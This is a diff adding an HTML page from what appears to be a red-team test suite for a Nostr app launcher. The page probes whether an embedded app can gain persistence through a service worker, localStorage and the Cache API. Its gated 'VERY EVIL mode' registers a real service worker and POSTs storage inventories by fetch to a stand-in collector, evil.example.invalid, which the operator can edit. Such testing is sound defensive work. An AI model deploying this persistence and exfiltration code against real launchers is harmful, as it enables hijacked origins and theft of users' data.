@@ -1,0 +1,758 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>evil-07 persistence</title>
+<meta name="description" content="Red team: a NAPP owns a real origin forever — service-worker slot, per-origin storage that survives launcher reloads, the Cache API. What the reference stubs and what it can't. Demo by default; VERY EVIL mode behind a typed gate.">
+<meta name="napp-id" content="evil-07-persistence">
+<!--
+  evil-napps ROE (see repo README):
+  - demo mode: probe + masked evidence only. no writes outside this frame
+    (one immediately-cleaned marker key on the napp's OWN origin proves
+    the origin grant, nothing more), no network, no signing, no dispatch,
+    no store mutation, no persistence, no destruction.
+  - ONE navigation exception: the ancestor-navigation probe can only detect
+    permission by navigating, so it reloads the launcher at its OWN current
+    URL with a marker hash — reversible, nothing leaves the launcher's URL.
+  - VERY EVIL mode: in-napp arming + stern confirmation that describes
+    every armed payload exactly + typed EXECUTE EVIL, then real execution,
+    destructive payloads last.
+  - default collector is https://evil.example.invalid/collect (RFC 2606,
+    non-resolving): even in VERY EVIL mode nothing leaves the machine.
+-->
+<style>
+  :root {
+    --bg: #120f16;
+    --fg: #e9e6f2;
+    --primary: #ff5470;
+    --ok: #3fd68f;
+    --warn: #ffb454;
+    --muted: #8d88a3;
+    --danger: #ff5470;
+    --surface: color-mix(in srgb, var(--bg) 88%, var(--fg));
+    --border: color-mix(in srgb, var(--fg) 16%, transparent);
+    --space-1: 4px;
+    --space-2: 8px;
+    --space-3: 12px;
+    --control-h: 28px;
+    --radius: 6px;
+    color-scheme: dark;
+    font: 12.5px/1.45 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+  }
+  html, body { height: 100%; margin: 0; }
+  #app {
+    container-type: inline-size;
+    height: 100%;
+    box-sizing: border-box;
+    display: flex;
+    flex-direction: column;
+    gap: var(--space-2);
+    padding: var(--space-2);
+    background: var(--bg);
+    color: var(--fg);
+    user-select: none;
+  }
+  .toolbar {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: var(--space-1);
+    min-height: var(--control-h);
+    flex: 0 0 auto;
+  }
+  .summary {
+    color: var(--muted);
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+  .summary b { color: var(--danger); }
+  .summary .ok-count { color: var(--ok); }
+  .summary .sent-count { color: var(--warn); }
+  .spacer { flex: 1; }
+  button {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    color: var(--fg);
+    cursor: pointer;
+    font: inherit;
+    height: var(--control-h);
+    padding: 0 10px;
+    white-space: nowrap;
+  }
+  button:hover:not(:disabled) { border-color: var(--primary); color: var(--primary); }
+  button:disabled { opacity: .45; cursor: default; }
+  button.arm { border-color: color-mix(in srgb, var(--danger) 60%, var(--border)); color: var(--danger); font-weight: 700; }
+  #rows {
+    flex: 1 1 auto;
+    min-height: 0;
+    overflow: auto;
+    display: grid;
+    grid-auto-rows: min-content;
+    gap: var(--space-1);
+    align-content: start;
+  }
+  @container (min-width: 760px) { #rows { grid-template-columns: 1fr 1fr; } }
+  @container (min-width: 1200px) { #rows { grid-template-columns: 1fr 1fr 1fr; } }
+  .attack {
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: var(--space-2);
+    display: grid;
+    gap: var(--space-1);
+    background: color-mix(in srgb, var(--surface) 30%, transparent);
+  }
+  .attack.armed, .attack.sent { border-color: color-mix(in srgb, var(--danger) 55%, var(--border)); }
+  .attack-head { display: flex; align-items: center; gap: var(--space-2); flex-wrap: wrap; }
+  .attack-name { font-weight: 700; }
+  .attack-target { color: var(--muted); font-size: 11px; }
+  .chip {
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    display: inline-flex;
+    align-items: center;
+    gap: 4px;
+    padding: 1px 6px;
+    font-size: 10px;
+    text-transform: uppercase;
+    letter-spacing: .04em;
+    white-space: nowrap;
+  }
+  .chip.status-armed { color: var(--danger); border-color: color-mix(in srgb, var(--danger) 55%, var(--border)); background: color-mix(in srgb, var(--danger) 12%, transparent); }
+  .chip.status-blocked { color: var(--ok); border-color: color-mix(in srgb, var(--ok) 45%, var(--border)); background: color-mix(in srgb, var(--ok) 10%, transparent); }
+  .chip.status-sent { color: var(--warn); border-color: color-mix(in srgb, var(--warn) 55%, var(--border)); background: color-mix(in srgb, var(--warn) 12%, transparent); }
+  .chip.status-na { color: var(--muted); }
+  .chip.sev-critical { color: var(--danger); }
+  .chip.sev-high { color: var(--warn); }
+  .chip.sev-info { color: var(--muted); }
+  .evidence {
+    color: var(--muted);
+    font-size: 11px;
+    user-select: text;
+    overflow-wrap: anywhere;
+  }
+  .row-actions { display: flex; gap: var(--space-1); }
+  .row-actions button { height: 22px; padding: 0 8px; font-size: 11px; }
+  #evilPanel {
+    border: 1px solid color-mix(in srgb, var(--danger) 55%, var(--border));
+    border-radius: var(--radius);
+    background: color-mix(in srgb, var(--danger) 8%, var(--surface));
+    padding: var(--space-2);
+    display: grid;
+    gap: var(--space-1);
+    max-height: 40%;
+    overflow: auto;
+    flex: 0 0 auto;
+  }
+  #evilPanel h2 { margin: 0; font-size: 11px; text-transform: uppercase; letter-spacing: .06em; color: var(--danger); }
+  .evil-log { font-size: 11px; white-space: pre-wrap; user-select: text; color: var(--fg); }
+  #reportBox { display: grid; gap: var(--space-1); flex: 0 0 auto; }
+  details#report, details#kit { border: 1px solid var(--border); border-radius: var(--radius); padding: var(--space-2); }
+  details#report summary, details#kit summary { cursor: pointer; color: var(--muted); }
+  #reportText {
+    box-sizing: border-box;
+    width: 100%;
+    min-height: 90px;
+    resize: vertical;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    color: var(--fg);
+    font: 11px/1.4 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    padding: var(--space-1);
+    user-select: text;
+  }
+  .kit-entry { margin-bottom: var(--space-2); }
+  .kit-entry .kit-label { color: var(--warn); font-size: 11px; }
+  .kit-entry .kit-note { color: var(--muted); font-size: 11px; margin: 2px 0; }
+  .kit-entry pre {
+    margin: 0;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: var(--space-1);
+    overflow: auto;
+    font: 10.5px/1.4 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    user-select: text;
+    max-height: 140px;
+  }
+  dialog {
+    background: var(--bg);
+    color: var(--fg);
+    border: 1px solid color-mix(in srgb, var(--danger) 55%, var(--border));
+    border-radius: 8px;
+    padding: var(--space-3);
+    max-width: min(640px, 92vw);
+    max-height: 86dvh;
+    overflow: auto;
+  }
+  dialog::backdrop { background: rgba(10, 6, 12, .8); }
+  dialog h2 { margin: 0 0 var(--space-2); color: var(--danger); font-size: 14px; text-transform: uppercase; letter-spacing: .08em; }
+  .stern { border: 1px solid var(--danger); border-radius: var(--radius); padding: var(--space-2); color: var(--danger); font-weight: 700; margin: 0 0 var(--space-2); }
+  .plan-list { margin: 0 0 var(--space-2); padding-left: 18px; }
+  .plan-list li { margin-bottom: var(--space-2); }
+  .plan-list b { color: var(--danger); }
+  label { display: block; color: var(--muted); font-size: 11px; margin-bottom: var(--space-1); }
+  input[type="text"], input[type="url"] {
+    box-sizing: border-box;
+    width: 100%;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    color: var(--fg);
+    font: inherit;
+    padding: 4px 8px;
+  }
+  dialog .confirm-row { display: flex; gap: var(--space-1); align-items: center; margin-top: var(--space-2); flex-wrap: wrap; }
+  #confirmBtn { border-color: var(--danger); color: var(--danger); font-weight: 700; }
+  #confirmBtn:not(:disabled):hover { background: var(--danger); color: var(--bg); }
+  .muted { color: var(--muted); font-size: 11px; }
+  @media (max-height: 240px) { .toolbar button .btn-label-long { display: none; } #reportBox { display: none; } }
+  @container (max-width: 300px) { .attack-target { display: none; } }
+  #hijack {
+    display: none;
+    background: var(--danger);
+    color: #14060a;
+    font-weight: 700;
+    text-align: center;
+    padding: var(--space-2);
+    flex: 0 0 auto;
+  }
+  #hijack a { color: inherit; }
+</style>
+</head>
+<body>
+<div id="app">
+  <div id="hijack">⚠ THIS PAGE JUST NAVIGATED THE LAUNCHER (window.top) AWAY — you are looking at the evil napp, not the launcher. <a href="about:blank" onclick="history.length > 1 ? history.back() : null; return false">go back</a> if you can.</div>
+  <div class="toolbar">
+    <span id="summary" class="summary">probing…</span>
+    <span class="spacer"></span>
+    <button id="runAllBtn" type="button">run all</button>
+    <button id="reportBtn" type="button">report</button>
+    <button id="armBtn" class="arm" type="button">ARM VERY EVIL MODE</button>
+  </div>
+  <div id="rows"></div>
+  <div id="evilPanel" hidden>
+    <h2>VERY EVIL MODE — execution log</h2>
+    <div id="evilLog" class="evil-log"></div>
+  </div>
+  <div id="reportBox">
+    <details id="report">
+      <summary>report (JSON)</summary>
+      <textarea id="reportText" rows="6" spellcheck="false"></textarea>
+      <div class="row-actions" style="margin-top: 6px;">
+        <button id="copyReportBtn" type="button">copy report</button>
+      </div>
+    </details>
+  </div>
+</div>
+
+<dialog id="confirmDlg" aria-labelledby="confirmTitle">
+  <form method="dialog" style="display:grid; gap: 0;">
+    <h2 id="confirmTitle">⚠ VERY EVIL MODE — final confirmation</h2>
+    <p class="stern">THIS WILL ACTUALLY EXECUTE THE ATTACKS. NOT A DRILL.</p>
+    <p class="muted">Every armed attack below will run for real, in this order (destructive payloads last). Where payloads egress, data leaves this frame toward the collector URL. Only a hardened launcher will stop them.</p>
+    <ol id="planList" class="plan-list"></ol>
+    <label>collector / exfiltration destination (edit to point at your own)
+      <input id="collectorInput" type="url" spellcheck="false">
+    </label>
+    <label>type <b style="color: var(--danger);">EXECUTE EVIL</b> exactly, case-sensitive, to enable the button
+      <input id="confirmInput" type="text" autocomplete="off" spellcheck="false" placeholder="EXECUTE EVIL">
+    </label>
+    <div class="confirm-row">
+      <button id="confirmBtn" type="button" disabled>EXECUTE — DO EVIL</button>
+      <button value="cancel" type="submit" style="align-self: center;">cancel — stay demo</button>
+    </div>
+  </form>
+</dialog>
+
+<script>
+'use strict';
+(function () {
+  window.__EVIL_ID__ = 'evil-07-persistence';
+  const DEFAULT_COLLECTOR = 'https://evil.example.invalid/collect';
+  const CONFIRM_PHRASE = 'EXECUTE EVIL';
+  const state = {
+    results: {},     // id -> { status, evidence }
+    evilResults: {}, // id -> object evidence of the real execution
+    veryEvil: false,
+    collector: DEFAULT_COLLECTOR,
+  };
+
+  const app = document.getElementById('app');
+  const rowsEl = document.getElementById('rows');
+  const summaryEl = document.getElementById('summary');
+  const evilPanel = document.getElementById('evilPanel');
+  const evilLog = document.getElementById('evilLog');
+  const armBtn = document.getElementById('armBtn');
+  const confirmDlg = document.getElementById('confirmDlg');
+  const confirmInput = document.getElementById('confirmInput');
+  const confirmBtn = document.getElementById('confirmBtn');
+  const collectorInput = document.getElementById('collectorInput');
+  const planList = document.getElementById('planList');
+  const reportText = document.getElementById('reportText');
+
+  // If this page ever IS the top-level browsing context, the launcher was
+  // hijacked to it — show the banner (see the hijack row in evil-01).
+  if (window.top === window) document.getElementById('hijack').style.display = 'block';
+
+  /* ---------- shared helpers ---------- */
+
+  function errMsg(e) {
+    if (!e) return String(e);
+    if (typeof e === 'string') return e;
+    return (e.name ? e.name + ': ' : '') + (e.message || String(e));
+  }
+  function mask(v, keep) {
+    keep = keep || 6;
+    const s = String(v);
+    if (s.length <= keep) return s.slice(0, 1) + '…';
+    return s.slice(0, keep) + '… (' + s.length + ' chars, masked)';
+  }
+  function randId() {
+    try { return crypto.randomUUID().slice(0, 8); }
+    catch (_) { return Math.random().toString(16).slice(2, 10); }
+  }
+  function randHex(n) {
+    const b = new Uint8Array(n / 2);
+    crypto.getRandomValues(b);
+    return Array.from(b).map(x => x.toString(16).padStart(2, '0')).join('');
+  }
+  function withTimeout(promise, ms) {
+    ms = ms || 2000;
+    return new Promise((resolve) => {
+      const t = setTimeout(() => resolve('timeout'), ms);
+      Promise.resolve(promise).then(
+        (v) => { clearTimeout(t); resolve(v); },
+        (e) => { clearTimeout(t); resolve({ __rejected: errMsg(e) }); }
+      );
+    });
+  }
+  function blocked(evidence) { return { status: 'blocked', evidence: evidence }; }
+  function armed(evidence) { return { status: 'armed', evidence: evidence }; }
+  function na(evidence) { return { status: 'na', evidence: evidence }; }
+  function sent(evidence) { return { status: 'sent', evidence: evidence }; }
+  function safeGet(fn) {
+    try { return fn(); } catch (e) { return 'denied: ' + errMsg(e); }
+  }
+  function findNostr() {
+    if (window.nostr) return window.nostr;
+    try { if (window.parent && window.parent.nostr) return window.parent.nostr; } catch (_) { /* cross-origin: held */ }
+    return null;
+  }
+  // NAPP context: instance id (window.name), the granted bridge surface,
+  // origin/position — captured once for every probe and the report.
+  function bridgePresence() {
+    return {
+      instance: safeGet(() => window.name) || null,
+      nostr: !!findNostr(),
+      nostrdb: typeof window.nostrdb === 'object',
+      napp: typeof window.napp === 'object',
+    };
+  }
+  function captureSummary() {
+    return JSON.stringify({
+      origin: safeGet(() => window.origin),
+      href: safeGet(() => location.href),
+      referrer: document.referrer,
+      instance: safeGet(() => window.name),
+      parentLength: safeGet(() => window.parent.length),
+      bridge: bridgePresence(),
+      at: new Date().toISOString(),
+    });
+  }
+  async function sendToCollector(kind, data) {
+    const url = state.collector;
+    const body = JSON.stringify({ kind: kind, at: new Date().toISOString(), data: data });
+    try {
+      const r = await withTimeout(fetch(url, { method: 'POST', mode: 'no-cors', body: body }), 4000);
+      if (r === 'timeout') return 'fetch timed out';
+      if (r && r.__rejected) return 'network egress failed: ' + r.__rejected;
+      return 'request dispatched to collector (opaque response) — egress channel OPEN';
+    } catch (e) {
+      return 'network egress failed: ' + errMsg(e) + ' — launcher/CSP held';
+    }
+  }
+  function postParent(msg) { window.parent.postMessage(msg, '*'); }
+  function postTop(msg) { window.top.postMessage(msg, '*'); }
+  function waitForMsg(id, ms) {
+    ms = ms || 2000;
+    return new Promise((resolve) => {
+      const on = (e) => {
+        if (e.data && e.data.id === id) {
+          cleanup(); resolve(e.data);
+        }
+      };
+      function cleanup() { window.removeEventListener('message', on); }
+      window.addEventListener('message', on);
+      setTimeout(() => { cleanup(); resolve('timeout'); }, ms);
+    });
+  }
+  // A bridge rpc with the napp dialect this suite speaks (mirrors the
+  // reference bridge.js): a postMessage envelope tagged __nostrapps:"rpc".
+  // The wait outlasts a permission dialog's stale-dismiss (4s) so a denied
+  // reply is never mistaken for silence.
+  function bridgeRpc(method, params) {
+    const id = 'evil-rpc-' + randId();
+    const p = waitForMsg(id, 6500);
+    postParent({
+      __nostrapps: 'rpc', id: id, method: method,
+      params: params, instanceId: window.name,
+    });
+    return p;
+  }
+  // sessionStorage flag that survives a launcher reload at this origin —
+  // used by probes that must navigate to detect (see top-nav row).
+  const NAV_FLAG = '__evil01_navprobe__';
+  function navProbeFlag() { try { return sessionStorage.getItem(NAV_FLAG); } catch (_) { return null; } }
+  function setNavProbeFlag() { try { sessionStorage.setItem(NAV_FLAG, new Date().toISOString()); } catch (_) {} }
+  function clearNavProbeFlag() { try { sessionStorage.removeItem(NAV_FLAG); } catch (_) {} }
+
+  // evil-07 — persistence (tier 2). NAPP.md: "Each napp has its own origin,
+// so localStorage is its own" — and a real origin is durable state: the
+// service-worker slot, IndexedDB, the Cache API, localStorage, all scoped to
+// the napp's origin and all surviving launcher reloads (until the launcher
+// wipes the origin, which is launcher policy, not protocol).
+//
+// The reference launcher defends the SW slot by STUBBING registration in
+// bridge.js (unconditionally) — and its boot.html actively unregisters any
+// foreign SW, which only makes sense BECAUSE a napp can register one while
+// `network` is granted (the LOCKED_CSP's worker-src 'none' holds it only
+// while locked). Validated from source; the harness's swstub knob models a
+// launcher that doesn't stub, and the at-launcher knob models the origin
+// mistake that makes registration real and effective.
+window.__EVIL_KIT__ = [
+  {
+    label: 'the shipped service worker',
+    note: 'A real, committed sw file in the napp\'s own folder. Under the at-launcher-origin mistake the path exists at the launcher origin; register() claims the scope and the bytes are served from then on by the attacker. Even where the SW pipeline holds (files live behind the launcher\'s SW), the register() call still happens for real in an unstubbed launcher — only the missing bytes hold it.',
+    data: { script: '/napps/evil-07-persistence/evil07-sw.js', scope: '/napps/evil-07-persistence/', survives: 'launcher reloads, napp uninstall (until the origin is wiped)' },
+  },
+  {
+    label: 'what the reference actually does (from source)',
+    note: 'bridge.js stubs navigator.serviceWorker.register unconditionally; boot.html unregisterForeignSWs() tears down any SW the napp registered while network was granted; LOCKED_CSP carries worker-src \'none\'. Every one of those is launcher policy — the protocol says nothing about the SW slot.',
+    data: { bridgeStub: true, bootUnregister: true, lockedWorkerSrc: 'none' },
+  },
+];
+
+const MARKER_KEY = '__evil07_persist__';
+const CACHE_NAME = '__evil07_cache__';
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+const ATTACKS = [
+  {
+    id: 'sw-slot',
+    name: 'service-worker slot',
+    target: 'the origin\'s single SW slot — reference: stubbed in bridge.js',
+    severity: 'critical',
+    destructive: true,
+    harm: 'A napp that registers a service worker at its origin (or, under the at-launcher mistake, at the LAUNCHER origin) owns that scope persistently: it serves its own bytes for every later load, survives launcher reloads, and — at the launcher origin — sits behind the launcher\'s own cookies and storage.',
+    evilBrief: 'Registers the REAL shipped service worker (napps/evil-07-persistence/evil07-sw.js) — where the bytes exist (the at-launcher mistake) this is a live persistent worker at the launcher origin; it then fetches through the scope to prove its bytes are served. DESTRUCTIVE (persisted): runs LAST; unregister from DevTools or the launcher.',
+    async demo() {
+      if (!('serviceWorker' in navigator) || !navigator.serviceWorker || !navigator.serviceWorker.register) {
+        return na('navigator.serviceWorker unavailable in this frame');
+      }
+      // The tell: registering a script that does not exist. A STUBBED
+      // register resolves with a fake registration (scope = origin root);
+      // a REAL one rejects for lack of bytes. ROE: no real SW is registered
+      // in demo mode.
+      try {
+        const reg = await navigator.serviceWorker.register('/__evil07_nonexistent_sw__.js');
+        const scope = reg && (reg.scope || (reg.installing && reg.installing.scriptURL)) || '?';
+        return blocked('register() RESOLVED without any script (scope ' + mask(scope, 40) + ') — the launcher stubs registration: the origin\'s SW slot stays owned by the launcher (the reference behavior)');
+      } catch (e) {
+        const m = errMsg(e);
+        if (/404|not found|Script|failed|network|cannot|error|unsupported/i.test(m)) {
+          return armed('registration was ATTEMPTED FOR REAL — rejected only for lack of bytes at my origin (' + m.slice(0, 60) + '). The slot is open: wherever a napp\'s bytes are directly reachable (the at-launcher mistake, or any origin serving its files), it owns the origin persistently');
+        }
+        return blocked('registration refused: ' + m.slice(0, 90));
+      }
+    },
+    async evil() {
+      const out = {};
+      try {
+        const url = '/napps/evil-07-persistence/evil07-sw.js';
+        const reg = await navigator.serviceWorker.register(url);
+        out.registered = true;
+        out.scope = reg.scope || '?';
+        // give the worker a moment to activate + claim
+        await sleep(800);
+        try {
+          const res = await fetch('/napps/evil-07-persistence/probe.txt', { cache: 'no-store' });
+          out.servedByEvilSW = (await res.text()).slice(0, 90);
+        } catch (e) { out.fetchError = errMsg(e); }
+      } catch (e) {
+        out.registered = false;
+        out.error = errMsg(e);
+      }
+      return out;
+    },
+  },
+  {
+    id: 'origin-persist',
+    name: 'per-origin storage survives the launcher',
+    target: 'NAPP.md: "Each napp has its own origin, so localStorage is its own"',
+    severity: 'high',
+    harm: 'The origin grant is durable state: a marker written now outlives the launcher session, survives reloads and re-launches, and nothing but a launcher-side wipe removes it. Persistence is a first-class NAPP capability.',
+    evilBrief: 'Writes a timestamped marker key to the origin (survives launcher reloads until the origin is wiped) and POSTs the storage inventory to the collector. The demo writes one documented marker too — persistence IS the finding; wipe the app to remove it.',
+    async demo() {
+      try {
+        const prior = localStorage.getItem(MARKER_KEY);
+        if (prior) {
+          return armed('my marker SURVIVED a launcher reload — written ' + prior + ', still here. Per-origin storage is durable by design: only a launcher-side wipe removes it (wipe this app to clean the marker)');
+        }
+        localStorage.setItem(MARKER_KEY, new Date().toISOString());
+        return armed('marker written to my origin now — reload the launcher and watch it survive. Per-origin storage is durable by design (this one documented marker persists until you wipe the app)');
+      } catch (e) {
+        return blocked('localStorage unreachable: ' + errMsg(e).slice(0, 80));
+      }
+    },
+    async evil() {
+      const out = {};
+      try {
+        localStorage.setItem(MARKER_KEY, new Date().toISOString());
+        out.marker = MARKER_KEY;
+        const keys = [];
+        for (let i = 0; i < localStorage.length; i++) keys.push(localStorage.key(i));
+        out.keys = keys;
+      } catch (e) { out.error = errMsg(e); }
+      out.exfil = await sendToCollector('origin-persist-inventory', { keys: out.keys });
+      return out;
+    },
+  },
+  {
+    id: 'caches-persist',
+    name: 'Cache API persistence',
+    target: 'the Cache Storage at the napp\'s origin — durable, unpoliced',
+    severity: 'info',
+    harm: 'caches.open() gives the napp a durable, origin-scoped store that no permission system names: it survives reloads, holds arbitrary bytes, and serves them to the origin\'s documents. Not a misconfig — a granted capability nobody talks about.',
+    evilBrief: 'Stashes a marker response in a named cache at the origin and POSTs the cache inventory to the collector. The demo also writes one documented marker cache entry (delete via DevTools → Application → Cache Storage).',
+    async demo() {
+      if (typeof caches === 'undefined' || !caches.open) return na('Cache API unavailable in this frame');
+      try {
+        const c = await caches.open(CACHE_NAME);
+        await c.put(new Request('/__evil07_marker__'), new Response('evil-07 cache marker ' + new Date().toISOString()));
+        const keys = await c.keys();
+        return armed('a durable cache exists at my origin (' + keys.length + ' entr[ies]) — survives reloads, no permission system names it (delete via DevTools → Cache Storage, or wipe the app)');
+      } catch (e) {
+        return blocked('cache write refused: ' + errMsg(e).slice(0, 80));
+      }
+    },
+    async evil() {
+      const out = {};
+      try {
+        const c = await caches.open(CACHE_NAME);
+        await c.put(new Request('/__evil07_stash__'), new Response('evil-07 stashed ' + Date.now()));
+        const names = await caches.keys();
+        out.cacheNames = names;
+        out.entries = await (await caches.open(CACHE_NAME)).keys();
+      } catch (e) { out.error = errMsg(e); }
+      out.exfil = await sendToCollector('caches-persist-inventory', { names: out.cacheNames });
+      return out;
+    },
+  },
+];
+
+
+  /* ---------- rendering ---------- */
+
+  function sevChip(sev) {
+    const s = sev === 'critical' ? 'sev-critical' : sev === 'high' ? 'sev-high' : 'sev-info';
+    return '<span class="chip ' + s + '">' + sev + '</span>';
+  }
+  function statusChip(st) {
+    const label = st === 'armed' ? 'ARMED' : st === 'blocked' ? 'HELD' : st === 'sent' ? 'SENT' : st === 'na' ? 'N/A' : st || '—';
+    return '<span class="chip status-' + (st || 'na') + '">' + label + '</span>';
+  }
+  function esc(s) {
+    return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/"/g, '&quot;');
+  }
+  function renderRows() {
+    rowsEl.innerHTML = '';
+    for (const a of ATTACKS) {
+      const r = state.results[a.id] || {};
+      const div = document.createElement('div');
+      div.className = 'attack' + (r.status === 'armed' || r.status === 'sent' ? ' ' + r.status : '');
+      div.dataset.attack = a.id;
+      div.dataset.status = r.status || 'pending';
+      div.innerHTML =
+        '<div class="attack-head">' +
+          statusChip(r.status) +
+          '<span class="attack-name">' + esc(a.name) + '</span>' +
+          sevChip(a.severity) +
+          '<span class="spacer"></span>' +
+          '<div class="row-actions"><button data-probe="' + a.id + '" type="button">probe</button></div>' +
+        '</div>' +
+        '<div class="attack-target">' + esc(a.target) + '</div>' +
+        '<div class="evidence">' + esc(r.evidence || 'not probed') + '</div>';
+      rowsEl.appendChild(div);
+    }
+    rowsEl.querySelectorAll('button[data-probe]').forEach((b) => {
+      b.addEventListener('click', () => runDemo(b.dataset.probe));
+    });
+  }
+  function renderSummary() {
+    const counts = { armed: 0, blocked: 0, na: 0, sent: 0 };
+    for (const a of ATTACKS) {
+      const s = (state.results[a.id] || {}).status;
+      if (counts[s] != null) counts[s]++;
+    }
+    summaryEl.innerHTML = state.veryEvil
+      ? '<b>VERY EVIL MODE ACTIVE</b> · payloads executed'
+      : 'demo mode · <b>' + counts.armed + ' armed</b> / <span class="ok-count">' + counts.blocked + ' held</span> / <span class="sent-count">' + counts.sent + ' sent</span> / ' + counts.na + ' n/a';
+    const armable = counts.armed + counts.sent;
+    armBtn.disabled = armable === 0;
+    armBtn.title = armable === 0 ? 'nothing armed — launcher held every probe' : armable + ' attack(s) armable';
+  }
+  function renderKit() {
+    const kit = window.__EVIL_KIT__;
+    if (!kit || !kit.length) return;
+    const d = document.createElement('details');
+    d.id = 'kit';
+    d.innerHTML = '<summary>attack kit — crafted inputs (copy)</summary>';
+    for (const entry of kit) {
+      const div = document.createElement('div');
+      div.className = 'kit-entry';
+      div.innerHTML =
+        '<div class="kit-label">' + esc(entry.label) + '</div>' +
+        (entry.note ? '<div class="kit-note">' + esc(entry.note) + '</div>' : '') +
+        '<pre>' + esc(typeof entry.data === 'string' ? entry.data : JSON.stringify(entry.data, null, 2)) + '</pre>' +
+        '<div class="row-actions"><button type="button">copy</button></div>';
+      div.querySelector('button').addEventListener('click', () => {
+        const text = typeof entry.data === 'string' ? entry.data : JSON.stringify(entry.data, null, 2);
+        try { void navigator.clipboard.writeText(text); } catch (_) { /* clipboard denied */ }
+      });
+      d.appendChild(div);
+    }
+    document.getElementById('reportBox').before(d);
+  }
+  function render() { renderRows(); renderSummary(); }
+
+  async function runDemo(id) {
+    const a = ATTACKS.find((x) => x.id === id);
+    if (!a) return;
+    state.results[id] = { status: 'pending', evidence: 'probing…' };
+    render();
+    try {
+      state.results[id] = await a.demo();
+    } catch (e) {
+      state.results[id] = { status: 'na', evidence: 'probe error: ' + errMsg(e) };
+    }
+    render();
+    updateReport();
+  }
+  async function runAllDemos() {
+    for (const a of ATTACKS) await runDemo(a.id);
+  }
+
+  /* ---------- VERY EVIL ---------- */
+
+  function planOrder() {
+    const plain = ATTACKS.filter((a) => a.evil && !a.destructive);
+    const last = ATTACKS.filter((a) => a.evil && a.destructive);
+    return plain.concat(last);
+  }
+  function openConfirm() {
+    const armable = planOrder().filter((a) => {
+      const s = (state.results[a.id] || {}).status;
+      return s === 'armed' || s === 'sent';
+    });
+    if (!armable.length) return;
+    planList.innerHTML = '';
+    for (const a of armable) {
+      const li = document.createElement('li');
+      li.innerHTML = '<b>' + esc(a.name) + '</b> — ' + esc(a.evilBrief || a.harm);
+      planList.appendChild(li);
+    }
+    collectorInput.value = state.collector;
+    confirmInput.value = '';
+    confirmBtn.disabled = true;
+    confirmDlg.showModal();
+  }
+  collectorInput.addEventListener('input', () => { state.collector = collectorInput.value.trim() || DEFAULT_COLLECTOR; });
+  confirmInput.addEventListener('input', () => { confirmBtn.disabled = confirmInput.value !== CONFIRM_PHRASE; });
+
+  confirmBtn.addEventListener('click', async () => {
+    confirmDlg.close();
+    await executeVeryEvil();
+  });
+
+  async function executeVeryEvil() {
+    state.veryEvil = true;
+    evilPanel.hidden = false;
+    evilLog.textContent = '';
+    const logLine = (s) => {
+      evilLog.textContent += '[' + new Date().toISOString() + '] ' + s + '\n';
+      evilLog.scrollTop = evilLog.scrollHeight;
+    };
+    logLine('VERY EVIL MODE — executing armed payloads against ' + safeGet(() => location.href));
+    logLine('collector: ' + state.collector);
+    renderSummary();
+    for (const a of planOrder()) {
+      const st = (state.results[a.id] || {}).status;
+      if (st !== 'armed' && st !== 'sent') {
+        state.evilResults[a.id] = { skipped: 'not armed (' + (st || 'unprobed') + ') — launcher holds' };
+        logLine('SKIP ' + a.name + ' — not armable, the launcher holds');
+        updateReport();
+        continue;
+      }
+      logLine('RUN  ' + a.name + ' — ' + (a.evilBrief || a.harm));
+      try {
+        state.evilResults[a.id] = await a.evil();
+        logLine('DONE ' + a.name + ' → ' + JSON.stringify(state.evilResults[a.id]).slice(0, 400));
+      } catch (e) {
+        state.evilResults[a.id] = { error: errMsg(e) };
+        logLine('ERR  ' + a.name + ' → ' + errMsg(e));
+      }
+      updateReport();
+      renderSummary();
+    }
+    logLine('finished. everything above actually happened.');
+    updateReport();
+  }
+
+  /* ---------- report ---------- */
+
+  function buildReport() {
+    return {
+      napp: window.__EVIL_ID__ || 'unknown',
+      mode: state.veryEvil ? 'VERY-EVIL' : 'demo',
+      at: new Date().toISOString(),
+      collector: state.collector,
+      location: safeGet(() => location.href),
+      origin: safeGet(() => window.origin),
+      referrer: document.referrer,
+      instance: safeGet(() => window.name),
+      bridge: bridgePresence(),
+      parentLength: safeGet(() => window.parent.length),
+      findings: ATTACKS.map((a) => Object.assign({ id: a.id, name: a.name, severity: a.severity }, state.results[a.id] || {}, { evil: state.evilResults[a.id] || null })),
+    };
+  }
+  function updateReport() {
+    reportText.value = JSON.stringify(buildReport(), null, 2);
+  }
+  document.getElementById('copyReportBtn').addEventListener('click', async () => {
+    try {
+      await navigator.clipboard.writeText(reportText.value);
+    } catch (_) {
+      reportText.select();
+    }
+  });
+  document.getElementById('reportBtn').addEventListener('click', () => {
+    const d = document.getElementById('report');
+    d.open = !d.open;
+  });
+
+  armBtn.addEventListener('click', () => { updateReport(); openConfirm(); });
+  document.getElementById('runAllBtn').addEventListener('click', () => { void runAllDemos(); });
+
+  /* ---------- boot ---------- */
+  renderKit();
+  render();
+  updateReport();
+  void runAllDemos();
+})();
+</script>
+</body>
+</html>
